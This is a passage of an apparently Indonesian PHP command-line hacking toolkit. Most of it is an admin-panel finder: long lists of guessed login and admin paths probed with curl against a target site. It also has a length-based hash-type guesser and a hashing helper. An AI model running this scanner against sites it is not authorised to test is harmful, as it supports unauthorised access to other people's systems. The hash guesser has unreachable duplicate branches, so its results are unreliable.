  'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
  'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
  'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
  'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
  'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
  'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
  'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
  'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
  'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
  'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
  'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
  'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
  'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
  'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php');
    }
    elseif($w == 4){
      $list = array('adminweb/','redaktur/', 'moderator/','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','retel/','operator/','moderator/', 'adm/','_adm_/','timadmin/','teamadmin/','myadmin/', 'masuk/', '4dm1n/', 'loggon/', 'adminpa/', 'admindisbun/', '_admin_/','loginadm', 'login_admin/', '_loginadmin_/', 'login_admin.php', '_admin_/ ', '_administrator_/','operator/', 'sika/','adminweb/','develop/','ketua/','redaktur/','author/','admin/','administrator/','adminweb/','user/','users/','dinkesadmin/','retel/','author/','panel/','paneladmin/','panellogin/','redaksi/','cp-admin/','Login@web/','admin1/','admin2/','admin3/','admin4/','admin5/','admin6/','admin7','admin8','admin9','admin10','master/','master/index.php','master/login.php','operator/index.php','sika/index.php','develop/index.php','ketua/index.php','redaktur/index.php','admin/index.php','administrator/index.php','adminweb/index.php','user/index.php','users/index.php','dinkesadmin/index.php','retel/index.php','author/index.php','panel/index.php','paneladmin/index.php','panellogin/index.php','redaksi/index.php','cp-admin/index.php','operator/login.php','sika/login.php','develop/login.php','ketua/login.php','redaktur/login.php','admin/login.php', 'administrator/login.php', 'adminweb/login.php', 'user/login.php','users/login.php', 'dinkesadmin/login.php','retel/login.php','author/login.php','panel/login.php','paneladmin/login.php','panellogin/login.php','redaksi/login.php','cp-admin/login.php','terasadmin/','terasadmin/index.php','terasadmin/login.php','rahasia/','rahasia/index.php','rahasia/admin.php','rahasia/login.php','dinkesadmin/','dinkesadmin/login.php','adminpmb/','adminpmb/index.php','adminpmb/login.php','system/','system/index.php','system/login.php','webadmin/','webadmin/index.php','webadmin/login.php','wpanel/','wpanel/index.php','wpanel/login.php','adminpanel/index.php','adminpanel/','adminpanel/login.php','adminkec/','adminkec/index.php','adminkec/login.php','admindesa/','admindesa/index.php','admindesa/login.php','adminkota/','adminkota/index.php','adminkota/login.php','admin123/','admin123/index.php','dologin/','home.asp/','supervise/amdin','relogin/adm','checkuser','relogin.php','relogin.asp','wp-admin','registration','suvervise','superman.php','member.php','home/admin','po-admin/','do_login.php','bo-login','bo_login.php/','index.php/admin','admiiin.php','masuk/adm','website_login/','dashboard/admin','dashboard.php','dashboard_adm','admin123/login.php','logout1/','logout/','pengelola/login','manageradm/','logout.asp','manager/adm','pengelola/web','auth/panel','logout/index.php','logout/login.php','controladm/','logout/admin.php','adminweb_setting/','
  usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
  'memberadmin/','administratorlogin/','adm/','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin/account.cfm',
  'admin_area/admin.cfm','admin_area/login.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
  'admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','admin_area/login.html','admin_area/index.html',
  'admin/controlpanel.cfm','admin.cfm','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
  'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
  'admin/cp.cfm','cp.cfm','administrator/index.cfm','administrator/login.cfm','nsw/admin/login.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm',
  'administrator/account.cfm','administrator.cfm','admin_area/admin.html','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm',
  'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm',
  'moderator/admin.cfm','account.cfm','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cfm','admincontrol.cfm',
  'admin/adminLogin.html','acceso.cfm','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cfm','adminarea/index.html','adminarea/admin.html',
  'webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cfm','moderator.html',
  'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
  'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
  'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cfm','account.html','controlpanel.html','admincontrol.html',
  'panel-administracion/login.cfm','wp-login.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm',
  'adminarea/admin.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm',
  'modelsearch/admin.cfm','admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','usuarios/login.cfm',
  'adm/index.cfm','adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm'
  );
    }
    elseif($w == 5){
      $list = array('adminweb/','redaktur/', 'moderator/','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','adminweb/','retel/','operator/','moderator/', 'adm/','_adm_/','timadmin/','teamadmin/','myadmin/', 'masuk/', '4dm1n/', 'loggon/', 'adminpa/', 'admindisbun/', '_admin_/','loginadm', 'login_admin/', '_loginadmin_/', 'login_admin.php', '_admin_/ ', '_administrator_/','operator/', 'sika/','adminweb/','develop/','ketua/','redaktur/','author/','admin/','administrator/','adminweb/','user/','users/','dinkesadmin/','retel/','author/','panel/','paneladmin/','panellogin/','redaksi/','cp-admin/','Login@web/','admin1/','admin2/','admin3/','admin4/','admin5/','admin6/','admin7','admin8','admin9','admin10','master/','master/index.php','master/login.php','operator/index.php','sika/index.php','develop/index.php','ketua/index.php','redaktur/index.php','admin/index.php','administrator/index.php','adminweb/index.php','user/index.php','users/index.php','dinkesadmin/index.php','retel/index.php','author/index.php','panel/index.php','paneladmin/index.php','panellogin/index.php','redaksi/index.php','cp-admin/index.php','operator/login.php','sika/login.php','develop/login.php','ketua/login.php','redaktur/login.php','admin/login.php', 'administrator/login.php', 'adminweb/login.php', 'user/login.php','users/login.php', 'dinkesadmin/login.php','retel/login.php','author/login.php','panel/login.php','paneladmin/login.php','panellogin/login.php','redaksi/login.php','cp-admin/login.php','terasadmin/','terasadmin/index.php','terasadmin/login.php','rahasia/','rahasia/index.php','rahasia/admin.php','rahasia/login.php','dinkesadmin/','dinkesadmin/login.php','adminpmb/','adminpmb/index.php','adminpmb/login.php','system/','system/index.php','system/login.php','webadmin/','webadmin/index.php','webadmin/login.php','wpanel/','wpanel/index.php','wpanel/login.php','adminpanel/index.php','adminpanel/','adminpanel/login.php','adminkec/','adminkec/index.php','adminkec/login.php','admindesa/','admindesa/index.php','admindesa/login.php','adminkota/','adminkota/index.php','adminkota/login.php','admin123/','admin123/index.php','dologin/','home.asp/','supervise/amdin','relogin/adm','checkuser','relogin.php','relogin.asp','wp-admin','registration','suvervise','superman.php','member.php','home/admin','po-admin/','do_login.php','bo-login','bo_login.php/','index.php/admin','admiiin.php','masuk/adm','website_login/','dashboard/admin','dashboard.php','dashboard_adm','admin123/login.php','logout1/','logout/','pengelola/login','manageradm/','logout.asp','manager/adm','pengelola/web','auth/panel','logout/index.php','logout/login.php','controladm/','logout/admin.php','adminweb_setting/','
  usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
  'memberadmin/','administratorlogin/','adm/','admin/account.aspx','admin/index.aspx','admin/login.aspx','admin/admin.aspx','admin/account.aspx',
  'admin_area/admin.aspx','admin_area/login.aspx','siteadmin/login.aspx','siteadmin/index.aspx','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
  'admin_area/index.aspx','bb-admin/index.aspx','bb-admin/login.aspx','bb-admin/admin.aspx','admin/home.aspx','admin_area/login.html','admin_area/index.html',
  'admin/controlpanel.aspx','admin.aspx','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
  'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
  'admin/cp.aspx','cp.aspx','administrator/index.aspx','administrator/login.aspx','nsw/admin/login.aspx','webadmin/login.aspx','admin/admin_login.aspx','admin_login.aspx',
  'administrator/account.aspx','administrator.aspx','admin_area/admin.html','pages/admin/admin-login.aspx','admin/admin-login.aspx','admin-login.aspx',
  'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.aspx','modelsearch/login.aspx','moderator.aspx','moderator/login.aspx',
  'moderator/admin.aspx','acceso.aspx','account.aspx','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.aspx','admincontrol.aspx',
  'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.aspx','adminarea/index.html','adminarea/admin.html',
  'webadmin.aspx','webadmin/index.aspx','webadmin/admin.aspx','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.aspx','moderator.html',
  'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
  'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
  'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.aspx','account.html','controlpanel.html','admincontrol.html',
  'panel-administracion/login.aspx','wp-login.aspx','adminLogin.aspx','admin/adminLogin.aspx','home.aspx','admin.aspx','adminarea/index.aspx',
  'adminarea/admin.aspx','adminarea/login.aspx','panel-administracion/index.aspx','panel-administracion/admin.aspx','modelsearch/index.aspx',
  'modelsearch/admin.aspx','admincontrol/login.aspx','adm/admloginuser.aspx','admloginuser.aspx','admin2.aspx','admin2/login.aspx','admin2/index.aspx','usuarios/login.aspx',
  'adm/index.aspx','adm.aspx','affiliate.aspx','adm_auth.aspx','memberadmin.aspx','administratorlogin.aspx'
  );
    }elseif ($w == 6) {
      $list = array('adminweb/','redaktur/', 'moderator/','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','adminweb/','moderator/','retel/','operator/','adm/','_adm_/','timadmin/','teamadmin/','myadmin/', 'masuk/', '4dm1n/', 'loggon/', 'adminpa/', 'admindisbun/', '_admin_/','loginadm', 'login_admin/', '_loginadmin_/', 'login_admin.php', '_admin_/ ', '_administrator_/','operator/', 'sika/','adminweb/','develop/','ketua/','redaktur/','author/','admin/','administrator/','adminweb/','user/','users/','dinkesadmin/','retel/','author/','panel/','paneladmin/','panellogin/','redaksi/','cp-admin/','Login@web/','admin1/','admin2/','admin3/','admin4/','admin5/','admin6/','admin7','admin8','admin9','admin10','master/','master/index.php','master/login.php','operator/index.php','sika/index.php','develop/index.php','ketua/index.php','redaktur/index.php','admin/index.php','administrator/index.php','adminweb/index.php','user/index.php','users/index.php','dinkesadmin/index.php','retel/index.php','author/index.php','panel/index.php','paneladmin/index.php','panellogin/index.php','redaksi/index.php','cp-admin/index.php','operator/login.php','sika/login.php','develop/login.php','ketua/login.php','redaktur/login.php','admin/login.php', 'administrator/login.php', 'adminweb/login.php', 'user/login.php','users/login.php', 'dinkesadmin/login.php','retel/login.php','author/login.php','panel/login.php','paneladmin/login.php','panellogin/login.php','redaksi/login.php','cp-admin/login.php','terasadmin/','terasadmin/index.php','terasadmin/login.php','rahasia/','rahasia/index.php','rahasia/admin.php','rahasia/login.php','dinkesadmin/','dinkesadmin/login.php','adminpmb/','adminpmb/index.php','adminpmb/login.php','system/','system/index.php','system/login.php','webadmin/','webadmin/index.php','webadmin/login.php','wpanel/','wpanel/index.php','wpanel/login.php','adminpanel/index.php','adminpanel/','adminpanel/login.php','adminkec/','adminkec/index.php','adminkec/login.php','admindesa/','admindesa/index.php','admindesa/login.php','adminkota/','adminkota/index.php','adminkota/login.php','admin123/','admin123/index.php','dologin/','home.asp/','supervise/amdin','relogin/adm','checkuser','relogin.php','relogin.asp','wp-admin','registration','suvervise','superman.php','member.php','home/admin','po-admin/','do_login.php','bo-login','bo_login.php/','index.php/admin','admiiin.php','masuk/adm','website_login/','dashboard/admin','dashboard.php','dashboard_adm','admin123/login.php','logout1/','logout/','pengelola/login','manageradm/','logout.asp','manager/adm','pengelola/web','auth/panel','logout/index.php','logout/login.php','controladm/','logout/admin.php','adminweb_setting/','
  usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
  'memberadmin/','administratorlogin/','adm/','admin/account.js','admin/index.js','admin/login.js','admin/admin.js','admin/account.js',
  'admin_area/admin.js','admin_area/login.js','siteadmin/login.js','siteadmin/index.js','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
  'admin_area/index.js','bb-admin/index.js','bb-admin/login.js','bb-admin/admin.js','admin/home.js','admin_area/login.html','admin_area/index.html',
  'admin/controlpanel.js','admin.js','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
  'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
  'admin/cp.js','cp.js','administrator/index.js','administrator/login.js','nsw/admin/login.js','webadmin/login.js','admin/admin_login.js','admin_login.js',
  'administrator/account.js','administrator.js','admin_area/admin.html','pages/admin/admin-login.js','admin/admin-login.js','admin-login.js',
  'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.js','modelsearch/login.js','moderator.js','moderator/login.js',
  'moderator/admin.js','account.js','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.js','admincontrol.js',
  'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.js','adminarea/index.html','adminarea/admin.html',
  'webadmin.js','webadmin/index.js','acceso.js','webadmin/admin.js','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.js','moderator.html',
  'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
  'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
  'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.js','account.html','controlpanel.html','admincontrol.html',
  'panel-administracion/login.js','wp-login.js','adminLogin.js','admin/adminLogin.js','home.js','admin.js','adminarea/index.js',
  'adminarea/admin.js','adminarea/login.js','panel-administracion/index.js','panel-administracion/admin.js','modelsearch/index.js',
  'modelsearch/admin.js','admincontrol/login.js','adm/admloginuser.js','admloginuser.js','admin2.js','admin2/login.js','admin2/index.js','usuarios/login.js',
  'adm/index.js','adm.js','affiliate.js','adm_auth.js','memberadmin.js','administratorlogin.js'
  );
    }elseif($w == 7){
      $list = array('adminweb/','redaktur/', 'moderator/','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','adminweb/','moderator/','retel/','operator/','adm/','_adm_/','timadmin/','teamadmin/','myadmin/', 'masuk/', '4dm1n/', 'loggon/', 'adminpa/', 'admindisbun/', '_admin_/','loginadm', 'login_admin/', '_loginadmin_/', 'login_admin.php', '_admin_/ ', '_administrator_/','operator/', 'sika/','adminweb/','develop/','ketua/','redaktur/','author/','admin/','administrator/','adminweb/','user/','users/','dinkesadmin/','retel/','author/','panel/','paneladmin/','panellogin/','redaksi/','cp-admin/','Login@web/','admin1/','admin2/','admin3/','admin4/','admin5/','admin6/','admin7','admin8','admin9','admin10','master/','master/index.php','master/login.php','operator/index.php','sika/index.php','develop/index.php','ketua/index.php','redaktur/index.php','admin/index.php','administrator/index.php','adminweb/index.php','user/index.php','users/index.php','dinkesadmin/index.php','retel/index.php','author/index.php','panel/index.php','paneladmin/index.php','panellogin/index.php','redaksi/index.php','cp-admin/index.php','operator/login.php','sika/login.php','develop/login.php','ketua/login.php','redaktur/login.php','admin/login.php', 'administrator/login.php', 'adminweb/login.php', 'user/login.php','users/login.php', 'dinkesadmin/login.php','retel/login.php','author/login.php','panel/login.php','paneladmin/login.php','panellogin/login.php','redaksi/login.php','cp-admin/login.php','terasadmin/','terasadmin/index.php','terasadmin/login.php','rahasia/','rahasia/index.php','rahasia/admin.php','rahasia/login.php','dinkesadmin/','dinkesadmin/login.php','adminpmb/','adminpmb/index.php','adminpmb/login.php','system/','system/index.php','system/login.php','webadmin/','webadmin/index.php','webadmin/login.php','wpanel/','wpanel/index.php','wpanel/login.php','adminpanel/index.php','adminpanel/','adminpanel/login.php','adminkec/','adminkec/index.php','adminkec/login.php','admindesa/','admindesa/index.php','admindesa/login.php','adminkota/','adminkota/index.php','adminkota/login.php','admin123/','admin123/index.php','dologin/','home.asp/','supervise/amdin','relogin/adm','checkuser','relogin.php','relogin.asp','wp-admin','registration','suvervise','superman.php','member.php','home/admin','po-admin/','do_login.php','bo-login','bo_login.php/','index.php/admin','admiiin.php','masuk/adm','website_login/','dashboard/admin','dashboard.php','dashboard_adm','admin123/login.php','logout1/','logout/','pengelola/login','manageradm/','logout.asp','manager/adm','pengelola/web','auth/panel','logout/index.php','logout/login.php','controladm/','logout/admin.php','adminweb_setting/','
  usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
  'memberadmin/','administratorlogin/','adm/','admin/account.cgi','admin/index.cgi','admin/login.cgi','admin/admin.cgi','admin/account.cgi',
  'admin_area/admin.cgi','admin_area/login.cgi','siteadmin/login.cgi','siteadmin/index.cgi','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
  'admin_area/index.cgi','bb-admin/index.cgi','bb-admin/login.cgi','bb-admin/admin.cgi','admin/home.cgi','admin_area/login.html','admin_area/index.html',
  'admin/controlpanel.cgi','admin.cgi','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
  'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
  'admin/cp.cgi','cp.cgi','administrator/index.cgi','administrator/login.cgi','nsw/admin/login.cgi','webadmin/login.cgi','admin/admin_login.cgi','admin_login.cgi',
  'administrator/account.cgi','administrator.cgi','admin_area/admin.html','pages/admin/admin-login.cgi','admin/admin-login.cgi','admin-login.cgi',
  'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cgi','modelsearch/login.cgi','moderator.cgi','moderator/login.cgi',
  'moderator/admin.cgi','account.cgi','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cgi','admincontrol.cgi',
  'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cgi','adminarea/index.html','adminarea/admin.html',
  'webadmin.cgi','webadmin/index.cgi','acceso.cgi','webadmin/admin.cgi','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cgi','moderator.html',
  'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
  'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
  'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cgi','account.html','controlpanel.html','admincontrol.html',
  'panel-administracion/login.cgi','wp-login.cgi','adminLogin.cgi','admin/adminLogin.cgi','home.cgi','admin.cgi','adminarea/index.cgi',
  'adminarea/admin.cgi','adminarea/login.cgi','panel-administracion/index.cgi','panel-administracion/admin.cgi','modelsearch/index.cgi',
  'modelsearch/admin.cgi','admincontrol/login.cgi','adm/admloginuser.cgi','admloginuser.cgi','admin2.cgi','admin2/login.cgi','admin2/index.cgi','usuarios/login.cgi',
  'adm/index.cgi','adm.cgi','affiliate.cgi','adm_auth.cgi','memberadmin.cgi','administratorlogin.cgi'
  );
    }elseif($w == 8){
      $list = array('adminweb/','redaktur/', 'moderator/','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','adminweb/','moderator/','retel/','operator/','adm/','_adm_/','timadmin/','teamadmin/','myadmin/', 'masuk/', '4dm1n/', 'loggon/', 'adminpa/', 'admindisbun/', '_admin_/','loginadm', 'login_admin/', '_loginadmin_/', 'login_admin.php', '_admin_/ ', '_administrator_/','operator/', 'sika/','adminweb/','develop/','ketua/','redaktur/','author/','admin/','administrator/','adminweb/','user/','users/','dinkesadmin/','retel/','author/','panel/','paneladmin/','panellogin/','redaksi/','cp-admin/','Login@web/','admin1/','admin2/','admin3/','admin4/','admin5/','admin6/','admin7','admin8','admin9','admin10','master/','master/index.php','master/login.php','operator/index.php','sika/index.php','develop/index.php','ketua/index.php','redaktur/index.php','admin/index.php','administrator/index.php','adminweb/index.php','user/index.php','users/index.php','dinkesadmin/index.php','retel/index.php','author/index.php','panel/index.php','paneladmin/index.php','panellogin/index.php','redaksi/index.php','cp-admin/index.php','operator/login.php','sika/login.php','develop/login.php','ketua/login.php','redaktur/login.php','admin/login.php', 'administrator/login.php', 'adminweb/login.php', 'user/login.php','users/login.php', 'dinkesadmin/login.php','retel/login.php','author/login.php','panel/login.php','paneladmin/login.php','panellogin/login.php','redaksi/login.php','cp-admin/login.php','terasadmin/','terasadmin/index.php','terasadmin/login.php','rahasia/','rahasia/index.php','rahasia/admin.php','rahasia/login.php','dinkesadmin/','dinkesadmin/login.php','adminpmb/','adminpmb/index.php','adminpmb/login.php','system/','system/index.php','system/login.php','webadmin/','webadmin/index.php','webadmin/login.php','wpanel/','wpanel/index.php','wpanel/login.php','adminpanel/index.php','adminpanel/','adminpanel/login.php','adminkec/','adminkec/index.php','adminkec/login.php','admindesa/','admindesa/index.php','admindesa/login.php','adminkota/','adminkota/index.php','adminkota/login.php','admin123/','admin123/index.php','dologin/','home.asp/','supervise/amdin','relogin/adm','checkuser','relogin.php','relogin.asp','wp-admin','registration','suvervise','superman.php','member.php','home/admin','po-admin/','do_login.php','bo-login','bo_login.php/','index.php/admin','admiiin.php','masuk/adm','website_login/','dashboard/admin','dashboard.php','dashboard_adm','admin123/login.php','logout1/','logout/','pengelola/login','manageradm/','logout.asp','manager/adm','pengelola/web','auth/panel','logout/index.php','logout/login.php','controladm/','logout/admin.php','adminweb_setting/','
  usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
  'memberadmin/','administratorlogin/','adm/','admin/account.brf','admin/index.brf','admin/login.brf','admin/admin.brf','admin/account.brf',
  'admin_area/admin.brf','admin_area/login.brf','siteadmin/login.brf','siteadmin/index.brf','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
  'admin_area/index.brf','bb-admin/index.brf','bb-admin/login.brf','bb-admin/admin.brf','admin/home.brf','admin_area/login.html','admin_area/index.html',
  'admin/controlpanel.brf','admin.brf','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
  'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
  'admin/cp.brf','cp.brf','administrator/index.brf','administrator/login.brf','nsw/admin/login.brf','webadmin/login.brfbrf','admin/admin_login.brf','admin_login.brf',
  'administrator/account.brf','administrator.brf','acceso.brf','admin_area/admin.html','pages/admin/admin-login.brf','admin/admin-login.brf','admin-login.brf',
  'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.brf','modelsearch/login.brf','moderator.brf','moderator/login.brf',
  'moderator/admin.brf','account.brf','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.brf','admincontrol.brf',
  'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.brf','adminarea/index.html','adminarea/admin.html',
  'webadmin.brf','webadmin/index.brf','webadmin/admin.brf','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.brf','moderator.html',
  'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
  'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
  'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.brf','account.html','controlpanel.html','admincontrol.html',
  'panel-administracion/login.brf','wp-login.brf','adminLogin.brf','admin/adminLogin.brf','home.brf','admin.brf','adminarea/index.brf',
  'adminarea/admin.brf','adminarea/login.brf','panel-administracion/index.brf','panel-administracion/admin.brf','modelsearch/index.brf',
  'modelsearch/admin.brf','admincontrol/login.brf','adm/admloginuser.brf','admloginuser.brf','admin2.brf','admin2/login.brf','admin2/index.brf','usuarios/login.brf',
  'adm/index.brf','adm.brf','affiliate.brf','adm_auth.brf','memberadmin.brf','administratorlogin.brf'
  );
    }
    else{
      echo "[-] Not Found!\n";
      die;
    }
    foreach ($list as $list_admin) {
      echo "[+] Checking ...\n";
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, $url.$list_admin);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_HEADER, 1);
      $go = curl_exec($ch);
      curl_close($ch);

      if (preg_match("/200 OK/", $go)) {
        echo "[+] Found! => $url$list_admin\n";
        die;
      }
      else{
        echo "[-] Die! => $url$list_admin\n";
      }
    }
  }
  elseif ($type == 3){
  	echo "=> Input Password: ";
  	$hash = trim(fgets(STDIN));
  	
          if (strlen($hash) == 32) {
             echo "MD5 / MD2 / MD4 Hash\n";
          } elseif (strlen($hash) == 40) {
             echo "SHA-1 Hash / MySQL5 Hash\n";
          } elseif (strlen($hash) == 13) {
             echo "DES(Unix) Hash\n";
          } elseif (strlen($hash) == 16) {
             echo "MySQL Hash / DES(Oracle Hash)\n";
          } elseif (strlen($hash) == 41) {
              $GetHashChar = substr($hash, 40);
              if ($GetHashChar == "*") {
                 echo "MySQL5 Hash\n";
              }
          } elseif (strlen($hash) == 64) {
             echo "SHA-256 Hash\n";
          } elseif (strlen($hash) == 96) {
             echo "SHA-384 Hash\n";
          } elseif (strlen($hash) == 128) {
             echo "SHA-512 Hash\n";
          } elseif (strlen($hash) == 34) {
              if (strstr($hash, '$1$')) {
                 echo "MD5(Unix) Hash\n";
              }
          } elseif (strlen($hash) == 37) {
              if (strstr($hash, '$apr1$')) {
                 echo "MD5(APR) Hash\n";
              }
          } elseif (strlen($hash) == 34) {
              if (strstr($hash, '$H$')) {
                 echo "MD5(phpBB3) Hash\n";
              }
          } elseif (strlen($hash) == 34) {
              if (strstr($hash, '$P$')) {
                 echo "MD5(Wordpress) Hash\n";
              }
          } elseif (strlen($hash) == 39) {
              if (strstr($hash, '$5$')) {
                 echo "SHA-256(Unix) Hash\n";
              }
          } elseif (strlen($hash) == 39) {
              if (strstr($hash, '$6$')) {
                 echo "SHA-512(Unix) Hash\n";
              }
          } elseif (strlen($hash) == 24) {
              if (strstr($hash, '==')) {
                 echo "MD5(Base-64) Hash\n";
              }
          } else {
             echo "Hash type not found\n";
          }
  }elseif($type == 4){
    echo "\n\n[+] Hash type [+]\n";
    echo "1. MD5 \t 6. SHA384\n";
    echo "2. MD2\t 7. SHA256\n";
    echo "3. MD4\n";
    echo "4. SHA1\n";
    echo "5. SHA512\n\n";
    echo "=> Pilih: ";
    $no = trim(fgets(STDIN));
    echo "Input String: ";
    $in = trim(fgets(STDIN));
    if ($no == 1) {
      echo "\n[+] success => " . md5($in) ."\n\n";
    }
    elseif ($no == 2) {
      echo "\n[+] success => " . hash("md2",$in) ."\n\n";
    }
    elseif ($no == 3) {
      echo "\n[+] success => " . hash("md4",$in) ."\n\n";
    }
    elseif ($no == 4) {
      echo "\n[+] success => " . sha1($in) ."\n\n";
    }
    elseif ($no == 5) {
      echo "\n[+] success => " . hash('sha512', $in) ."\n\n";
      
    }
    elseif ($no == 6) {
